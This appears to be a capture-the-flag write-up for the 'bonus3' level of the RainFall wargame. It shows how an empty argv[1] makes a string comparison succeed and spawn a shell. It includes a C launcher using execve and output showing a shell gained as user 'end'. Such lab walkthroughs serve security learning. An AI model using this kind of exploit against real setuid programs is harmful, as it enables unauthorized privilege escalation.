To crack the source code, we shall put the char `NULL` == `\0` as argv[1]

```C
str[atoi(argv[1])] = 0;
//str[0] will be NULL
//argv[1] == NULL

if ( !strcmp(str, argv[1]) )
    execl("/bin/sh", "sh", 0);
// strcmp will return 0, and we will enter the condition
```

BUT !!
```
Shell Behavior: Shells typically treat the null character as a delimiter between arguments.
```

To bypass the shell, we will launch the program in a C  program with NULL as argv[1]


```bash
bonus3@RainFall:~$ nano /tmp/exploit.c
```

```C
#include <unistd.h>
#include <sys/types.h>

int main() {
    char *argv[] = {"/home/user/bonus3/bonus3", "\0", NULL};
    execve("/home/user/bonus3/bonus3", argv, NULL);
    return  0;
}
```

```bash
bonus3@RainFall:~$ gcc /tmp/exploit.c -o /tmp/a.out
bonus3@RainFall:~$ cd /tmp/
bonus3@RainFall:/tmp$ ./a.out
$ ls
a.out  exploit.c
$ whoami
end
```
